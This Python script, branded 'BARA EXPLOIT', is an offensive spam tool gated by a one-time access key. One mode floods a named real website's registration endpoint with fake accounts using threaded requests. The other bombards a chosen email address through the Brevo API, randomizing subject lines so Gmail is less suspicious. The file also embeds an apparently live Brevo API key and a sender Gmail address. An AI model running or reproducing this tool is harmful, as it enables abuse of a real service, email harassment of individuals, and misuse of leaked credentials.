import requests
import random
import string
import time
import os
import sys
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[-] Install : pip install colorama requests")
    sys.exit()

# ==========================================
# KONFIGURASI
# ==========================================
TARGET_URL = "https://nova-wawa.vercel.app/api/register"
USED_KEYS_FILE = "used_keys.txt"

# --- KONFIGURASI BREVO API V3 ---
BREVO_API_KEY = "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"
BREVO_API_URL = "https://api.brevo.com/v3/smtp/email"
BREVO_SENDER_EMAIL = "partosartini41@gmail.com" 
BREVO_SENDER_NAME = "BARA EXPLOIT"

# Kode Warna ANSI
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_BLUE = '\033[94m'
C_MAGENTA = '\033[95m'
C_CYAN = '\033[96m'
C_WHITE = '\033[97m'
C_RESET = '\033[0m'
C_BOLD = '\033[1m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def animasi_banner():
    ascii_art = [
        "██████╗  █████╗ ██████╗  █████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗",
        "██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
        "██████╔╝███████║██████╔╝███████║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ",
        "██╔══██╗██╔══██║██╔══██╗██╔══██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ",
        "██████╔╝██║  ██║██║  ██║██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ",
        "╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
    ]
    colors = [C_RED, C_YELLOW, C_GREEN, C_CYAN, C_BLUE, C_MAGENTA]
    
    for shift in range(20): 
        clear()
        print("\n")
        for i, line in enumerate(ascii_art):
            color_idx = (i + shift) % len(colors)
            print(f"{colors[color_idx]}{C_BOLD}{line}{C_RESET}")
        print(f"\n{C_WHITE}                        [ PREMIUM TOOLKING V3 ]{C_RESET}")
        print(f"{C_WHITE}                              Dev: BARA{C_RESET}\n")
        time.sleep(0.1)

def get_decrypted_keys():
    if not os.path.exists('get_key.js'):
        print(f"\n{C_RED}[❌] File get_key.js nggak ada di folder ini!{C_RESET}")
        return []
        
    try:
        result = subprocess.run(['node', 'get_key.js'], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"\n{C_RED}[❌] Gagal decrypt apikey.js (Error Node.js).{C_RESET}")
            return []
        keys = json.loads(result.stdout)
        return keys
    except FileNotFoundError:
        print(f"\n{C_RED}[❌] Node.js belum keinstall! Jalanin: pkg install nodejs -y{C_RESET}")
        return []
    except Exception as e:
        print(f"\n{C_RED}[❌] Error sistem: {e}{C_RESET}")
        return []

def is_key_used(key):
    if not os.path.exists(USED_KEYS_FILE):
        return False
    with open(USED_KEYS_FILE, "r") as f:
        used = f.read().splitlines()
    return key in used

def mark_key_used(key):
    with open(USED_KEYS_FILE, "a") as f:
        f.write(key + "\n")

# ==========================================
# MENU 1: SPAM REGISTER
# ==========================================
def tembak_register():
    rand_str = ''.join(random.choices(string.ascii_lowercase, k=4))
    timestamp = int(time.time() * 1000) 
    prefix = random.choice(["User", "VIP", "Siswa", "Member", "Baru", "Bara", "Anon"])
    nama = f"{prefix}_{rand_str}"
    password = f"Qwerty{random.randint(100, 999)}!"
    
    payload = {
        "full_name": nama,
        "birth_year": str(random.randint(1990, 2006)),
        "email": f"{nama.lower()}_{timestamp}@gmail.com",
        "password": password,
        "agree": True
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "Origin": "https://nova-wawa.vercel.app"
    }
    try:
        res = requests.post(TARGET_URL, json=payload, headers=headers, timeout=5)
        return res.status_code in [200, 201]
    except:
        return False

def eksekusi_spam(jumlah):
    print(f"\n{C_YELLOW}[*] Menyiapkan {jumlah} akun...{C_RESET}")
    time.sleep(0.5)
    start_time = time.time()
    sukses = 0
    print(f"{C_CYAN}[*] Menembak server...{C_RESET}")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(tembak_register) for _ in range(jumlah)]
        for i, f in enumerate(futures):
            if f.result(): sukses += 1
            percent = int((i + 1) / jumlah * 100)
            sys.stdout.write(f"\r{C_GREEN}[Progress] {percent}% ({sukses} Sukses){C_RESET}")
            sys.stdout.flush()
            
    elapsed = time.time() - start_time
    print(f"\n\n{C_GREEN}======================================================{C_RESET}")
    print(f"{C_GREEN}[✅] SPAM SELESAI! Sukses: {sukses} | Gagal: {jumlah - sukses} | Waktu: {elapsed:.2f}s{C_RESET}")

# ==========================================
# MENU 2: SPAM EMAIL (BREVO API V3)
# ==========================================
def kirim_email_brevo(target, pesan):
    # UI HTML Sederhana (Biar Gmail Ga Curiga)
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <body style="font-family: Arial, sans-serif; padding: 20px; background-color: #ffffff; color: #333333;">
        <div style="max-width: 500px; margin: auto; border: 1px solid #dddddd; padding: 20px; border-radius: 5px;">
            <h2 style="color: #333333;">Pesan Penting</h2>
            <hr style="border: 0; border-top: 1px solid #eeeeee;">
            <p style="font-size: 16px;">{pesan}</p>
            <br>
            <p style="font-size: 14px; color: #888888;">Dikirim oleh: <b>BARA</b></p>
        </div>
    </body>
    </html>
    """

    subjek_aman = random.choice([
        "Pesan Penting", "Halo, ada info buat kamu", 
        "Update Terbaru", "Cek ini", "Informasi"
    ])

    payload = {
        "sender": {"name": BREVO_SENDER_NAME, "email": BREVO_SENDER_EMAIL},
        "to": [{"email": target}],
        "subject": f"{subjek_aman} {random.randint(100, 999)}",
        "htmlContent": html_content
    }

    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "api-key": BREVO_API_KEY
    }

    try:
        res = requests.post(BREVO_API_URL, headers=headers, json=payload, timeout=10)
        if res.status_code in [200, 201, 202]:
            return True, "OK"
        else:
            return False, f"HTTP {res.status_code}: {res.text}"
    except Exception as e:
        return False, str(e)

def eksekusi_spam_email():
    clear()
    print(f"{C_CYAN}=== SPAM EMAIL (BREVO API) ==={C_RESET}")
    target = input(f"{C_YELLOW}Email Target: {C_RESET}")
    pesan = input(f"{C_YELLOW}Pesan: {C_RESET}")
    try:
        jumlah = int(input(f"{C_YELLOW}Jumlah spam: {C_RESET}"))
    except:
        return

    print(f"\n{C_YELLOW}[*] Memproses...{C_RESET}")
    sukses = 0
    for i in range(1, jumlah + 1):
        berhasil, error_msg = kirim_email_brevo(target, pesan)
        if berhasil:
            sukses += 1
            print(f"{C_GREEN}[✅] [{i}/{jumlah}] Terkirim!{C_RESET}")
        else:
            print(f"{C_RED}[❌] [{i}/{jumlah}] Gagal: {error_msg}{C_RESET}")
        time.sleep(3) 
        
    print(f"\n{C_GREEN}[✅] Selesai! Sukses: {sukses}/{jumlah}{C_RESET}")

# ==========================================
# MAIN MENU
# ==========================================
def main():
    animasi_banner()
    
    print(f"{C_CYAN}[*] Membaca API Key lewat Node.js...{C_RESET}")
    valid_keys = get_decrypted_keys()
    if not valid_keys:
        print(f"\n{C_RED}[❌] Gagal load API Key. Cek error di atas.{C_RESET}")
        sys.exit()

    print(f"{C_YELLOW}Masukkan API TOKEN: {C_RESET}")
    user_key = input("> ").strip()

    if user_key not in valid_keys:
        print(f"\n{C_RED}[❌] API KEY TIDAK VALID! Akses Ditolak.{C_RESET}")
        sys.exit()

    if is_key_used(user_key):
        print(f"\n{C_RED}[❌] API KEY SUDAH DIPAKAI! Key hangus.{C_RESET}")
        sys.exit()

    mark_key_used(user_key)
    print(f"{C_GREEN}[✅] API KEY VALID!{C_RESET}")
    time.sleep(1)

    while True:
        clear()
        m_c = [C_CYAN, C_MAGENTA, C_GREEN][int(time.time()) % 3]
        
        print(f"""{m_c}
======================================================
                BARA EXPLOIT - MAIN MENU
======================================================
{C_YELLOW}1. {C_WHITE}Spam Register (Nova Wawa)
{C_YELLOW}2. {C_WHITE}Spam Email (Brevo API)
{C_YELLOW}0. {C_WHITE}Keluar
{m_c}======================================================
{C_WHITE}Dev: BARA | Key: {user_key[:5]}***{C_RESET}""")
        
        pilihan = input(f"{C_YELLOW}Pilih menu (0-2): {C_RESET}").strip()

        if pilihan == '1':
            try:
                jml = int(input(f"{C_YELLOW}Jumlah spam (max 500): {C_RESET}"))
                eksekusi_spam(jml)
            except: pass
            input(f"\n{C_CYAN}Tekan Enter...{C_RESET}")
        elif pilihan == '2':
            eksekusi_spam_email()
            input(f"\n{C_CYAN}Tekan Enter...{C_RESET}")
        elif pilihan == '0':
            print(f"{C_RED}[!] Keluar...{C_RESET}")
            sys.exit()
        else:
            print(f"{C_RED}[!] Pilihan tidak valid!{C_RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] Dihentikan sama user. Kabur lek!{C_RESET}")
        sys.exit()
